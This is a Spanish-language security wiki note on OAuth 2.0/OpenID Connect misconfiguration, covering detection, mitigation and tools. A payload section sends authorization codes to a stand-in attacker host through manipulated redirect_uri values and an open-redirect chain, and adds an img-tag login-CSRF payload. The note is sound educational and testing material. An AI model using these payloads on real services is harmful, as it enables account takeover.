---
tags:
  - seguridad-web
  - owasp
  - oauth
aliases:
  - OAuth mal configurado
  - OAuth Misconfiguration
  - Ataques OAuth
---

# OAuth mal configurado

**Una implementación deficiente de OAuth 2.0 / OpenID Connect permite robar el `code`/token de autorización o vincular cuentas ajenas, normalmente por una validación laxa de `redirect_uri`, falta del parámetro `state` o confianza ciega en datos del proveedor.**

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
En el flujo de código de autorización, el proveedor (Google, GitHub…) devuelve un `code` a la `redirect_uri` registrada, que el cliente canjea por un token. Los fallos clásicos: la `redirect_uri` se valida por prefijo/subcadena (no exacta), falta `state` (lo que habilita CSRF de login), el `code` se filtra por `Referer`/`Open Redirect`, o la app confía en un email no verificado para vincular cuentas. El resultado suele ser [[Account Takeover]].

## Detección y pruebas
Examina la petición de autorización: ¿se valida `redirect_uri` de forma exacta? ¿hay `state` y se comprueba? ¿el `code` es de un solo uso? Prueba a alterar `redirect_uri` (dominios, paths, subdominios), a omitir `state`, y a reusar el `code`. Verifica si el proveedor marca el email como verificado y si la app lo respeta al hacer el *account linking*.

## Explotación / payloads
**Redirección de la `redirect_uri` para exfiltrar el code:**

```
https://idp.com/auth?client_id=ID&redirect_uri=https://atacante.com&response_type=code
https://idp.com/auth?...&redirect_uri=https://app.com.atacante.com
https://idp.com/auth?...&redirect_uri=https://app.com/callback/../redirect?u=atacante.com
```

**Robo de code vía Open Redirect encadenado** (la `redirect_uri` válida reenvía al atacante):

```
redirect_uri=https://app.com/cb?next=https://atacante.com
```

**CSRF de login por falta de `state`** (fijar la sesión del atacante en la víctima):

```html
<img src="https://app.com/oauth/callback?code=CODE_DEL_ATACANTE">
```

**Account linking por email no verificado:** registrar la cuenta con el email de la víctima y luego vincular el login social.

## Mitigación
- Validar `redirect_uri` por **coincidencia exacta** contra una allowlist; nada de prefijos ni comodines.
- Usar y verificar el parámetro **`state`** (anti-CSRF) y **PKCE** en clientes públicos/SPAs.
- Tratar el `code` como de un solo uso y vida corta; no aceptar tokens no destinados a tu `client_id` (validar `aud`).
- No vincular cuentas por email sin verificar; exigir confirmación explícita en el *account linking*.

## Herramientas
- **Burp Suite** — manipulación de `redirect_uri`/`state` y seguimiento del flujo.
- **EsPReSSO** (extensión de Burp) — análisis de flujos SSO/OAuth/SAML.

---
🔗 Relacionado: [[JWT (JSON Web Token)]] · [[Ataques SAML]] · [[Account Takeover]] · [[Open Redirect]]
📚 Fuente: [PayloadsAllTheThings — OAuth Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration) (MIT, © Swissky)
